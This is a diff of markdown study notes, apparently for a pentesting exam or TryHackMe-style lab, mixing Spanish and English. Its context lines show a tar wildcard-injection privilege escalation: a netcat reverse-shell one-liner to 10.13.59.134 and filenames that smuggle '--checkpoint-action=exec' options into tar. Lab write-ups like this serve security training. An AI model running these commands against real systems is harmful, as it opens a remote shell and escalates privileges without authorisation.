@@ -134,12 +134,18 @@ touch "/var/www/html/--checkpoint=1"
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.59.134 9999 >/tmp/f" > shell.sh
 touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
 touch "/var/www/html/--checkpoint=1" 
+
 ```
+6. Descrifrar archivo
+Depende con que herramienta fue cidrado el archivo, por lo que habra que identificar
+
+**Links recomendados**
++ https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-smb
 **Sala recomendadas:** 
 + https://tryhackme.com/r/room/skynet
 + https://tryhackme.com/r/room/nerdherd
 
-5. An insider attack has been identified in one of the employees mobile device in 192.168.0.0/24 subnet. You are assigned to covertly access the users device and obtain malicious elf files stored in a folder “Scan”. Perform deep scan on the elf files and obtain the last 4 digits of SHA384 hash of the file with highest entropy value.
+### 5. An insider attack has been identified in one of the employees mobile device in 192.168.0.0/24 subnet. You are assigned to covertly access the users device and obtain malicious elf files stored in a folder “Scan”. Perform deep scan on the elf files and obtain the last 4 digits of SHA384 hash of the file with highest entropy value.
 
 6. Perform a vulnerability scan for the host with IP address 172.20.0.16
 What is the severity score of a vulnerability the indicates the End of
